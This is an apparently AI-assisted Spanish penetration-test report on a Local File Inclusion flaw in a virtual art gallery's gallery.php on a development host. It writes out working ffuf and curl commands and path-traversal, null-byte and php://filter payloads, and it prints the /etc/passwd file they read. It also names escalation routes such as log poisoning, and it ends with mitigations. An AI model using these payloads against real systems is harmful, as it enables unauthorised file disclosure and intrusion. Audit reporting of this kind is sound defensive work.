# Informe de auditoría LFI — Galería de Arte Virtual

Fecha (UTC): 2026-04-27T15:53:00Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en el parámetro "page" de /gallery.php.
- Evidencia de explotación: lectura exitosa del fichero /etc/passwd (contenido incluido más abajo).

Detalles técnicos
-----------------
URL vulnerable:
- http://web.dev.local:8081/gallery.php?page=<payload>

Parámetro vulnerable:
- page (GET)

Comandos y herramientas empleadas (Kali Linux)
---------------------------------------------
- Recon / fuzzing (ejemplo utilizado):
  ffuf -u http://web.dev.local:8081/gallery.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40 -mc 200

- Confirmación / explotación (peticiones exactas):
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00"
  curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd" | base64 -d

Payloads que permitieron descubrir y leer ficheros
---------------------------------------------------
1) Traversal simple:
- ../../../../../../etc/passwd
- ../../../../../etc/passwd

2) Null byte termination (para bypass de comprobaciones de extensión en aplicaciones PHP antiguas):
- ../../../../../../etc/passwd%00

3) Wrapper php://filter para forzar lectura codificada en Base64 y evadir ciertos filtros de salida:
- php://filter/read=convert.base64-encode/resource=/etc/passwd

Evidencia de lectura (/etc/passwd)
---------------------------------
Se extrajo el siguiente contenido en la respuesta HTML (fragmento):

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

Impacto y grado de explotación
-------------------------------
- Lectura de /etc/passwd confirmada: información sobre cuentas del sistema, presencia del usuario www-data (posible usuario de la aplicación).
- Dado el acceso LFI, es posible intentar escalada a RCE mediante técnicas adicionales (log poisoning, inclusion de /proc/self/environ, explotación de ficheros subidos, búsqueda de claves privadas en directorios accesibles, etc.).
- En esta evaluación se confirma lectura de fichero sensibles del sistema: por tanto se marca la vulnerabilidad como explotada (LFI -> lectura de /etc/passwd).

Recomendaciones de mitigación
-----------------------------
- No usar datos de entrada directamente en include/require; aplicar lista blanca de ficheros permitidos (basename + whitelist).
- Usar funciones de enrutamiento que mapeen valores de parámetro a rutas internas fijas.
- Deshabilitar wrappers peligrosos y revisar open_basedir y allow_url_include en la configuración de PHP.
- Limitar permisos de archivos sensibles; asegurar que la aplicación web no tenga acceso a ficheros críticos del sistema.
- Aplicar parches y actualizar PHP/servidor si procede.

Comandos y observaciones adicionales
------------------------------------
- Cabeceras del servidor observadas: Server: Apache/2.4.65 (Debian), X-Powered-By: PHP/8.1.33
- Se recomienda revisar /var/www por ficheros de configuración (config.php, .env, backups) y restringir su lectura.

Conclusión
----------
- Resultado: LFI confirmado en gallery.php?page y fichero crítico (/etc/passwd) leído con éxito.
- Recomendación inmediata: bloquear el parámetro, implementar whitelist y revisar el código de inclusión de páginas.

Anexos
------
- Comandos exactos y payloads ya incluidos arriba. Si se desea, se puede proceder a ejecutar una batería adicional para intentar lectura de /etc/shadow, extracción de claves privadas o técnicas de RCE por Log Poisoning; esas acciones requieren autorizaciones adicionales y serán ejecutadas solo si se confirman como permitidas.




Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>
